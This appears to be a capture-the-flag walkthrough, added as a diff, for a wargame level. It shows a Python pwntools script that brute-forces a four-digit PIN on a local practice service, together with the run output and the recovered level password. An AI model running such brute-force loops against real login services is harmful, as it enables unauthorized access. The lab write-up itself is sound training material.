@@ -1,0 +1,66 @@
+Let us use Python for scripting the brute-force, and get help
+from the package pwntools to ease the socket connection and
+communication:
+
+~$ mktemp -d
+/tmp/tmp.9joQzTrAoa
+
+~$ cd /tmp/tmp.9joQzTrAoa
+~/tmp/tmp.9joQzTrAoa$ vim 25.py
+
+In VIM, let us write the following Python pwntools script:
+
+from pwn import *
+
+r = remote('127.0.0.1',30002)
+
+for i in range(10000):
+    pincode = '0'*(4-len(str(i))) + str(i)
+    recvd = r.recvline()
+    if not recvd.startswith("I am") and not recvd.startswith("Wrong"):
+        print recvd
+    r.sendline('UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ ' + pincode)
+
+This script will try all possible pins, until it sees a received
+message that does not start with "I am" (the first message of the server)
+and "Wrong". At that point, possibly, an EOFError will occur since the
+server will shut down, and we will send a line; but this does not create
+any issue for our purposes.
+
+Let us run the script:
+
+~/tmp/tmp.9joQzTrAoa$ python 25.py
+[+] Opening connection to 127.0.0.1 on port 30002: Done
+Correct!
+
+The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
+
+
+Exiting.
+
+Traceback (most recent call last):
+  File "25.py", line 7, in <module>
+    recvd = r.recvline()
+  File "/usr/local/lib/python2.7/dist-packages/pwnlib/tubes/tube.py", line 426, in recvline
+    return self.recvuntil(self.newline, drop = not keepends, timeout = timeout)
+  File "/usr/local/lib/python2.7/dist-packages/pwnlib/tubes/tube.py", line 305, in recvuntil
+    res = self.recv(timeout=self.timeout)
+  File "/usr/local/lib/python2.7/dist-packages/pwnlib/tubes/tube.py", line 78, in recv
+    return self._recv(numb, timeout) or ''
+  File "/usr/local/lib/python2.7/dist-packages/pwnlib/tubes/tube.py", line 156, in _recv
+    if not self.buffer and not self._fillbuffer(timeout):
+  File "/usr/local/lib/python2.7/dist-packages/pwnlib/tubes/tube.py", line 126, in _fillbuffer
+    data = self.recv_raw(self.buffer.get_fill_size())
+  File "/usr/local/lib/python2.7/dist-packages/pwnlib/tubes/sock.py", line 46, in recv_raw
+    raise EOFError
+EOFError
+[*] Closed connection to 127.0.0.1 port 30002
+
+As you can see, our Python script printed out the following password:
+
+Correct!
+
+The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
+So, we got it! The password is: uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
